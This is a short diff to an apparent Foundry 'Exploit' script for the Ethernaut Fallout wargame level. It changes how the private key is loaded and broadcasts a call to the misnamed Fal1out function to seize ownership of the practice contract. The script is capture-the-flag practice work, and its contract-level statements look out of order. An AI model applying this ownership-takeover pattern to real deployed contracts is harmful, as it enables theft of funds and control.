@@ -201,11 +201,12 @@ contract Exploit is Script {
 
       Fallout level = Fallout(payable(address(instance)));
       address instance = vm.envAddress("INSTANCE_LEVEL2");
-      address hacker = vm.envAddress("PRIVATE_KEY");   
+      uint256 hacker = vm.envUint("PRIVATE_KEY");    
+      address deployer = vm.rememberKey(hacker);
       
       function run() external {
 
-          vm.startBroadcast(hacker);
+          vm.startBroadcast(deployer);
           level.Fal1out();
           vm.stopBroadcast();
     }
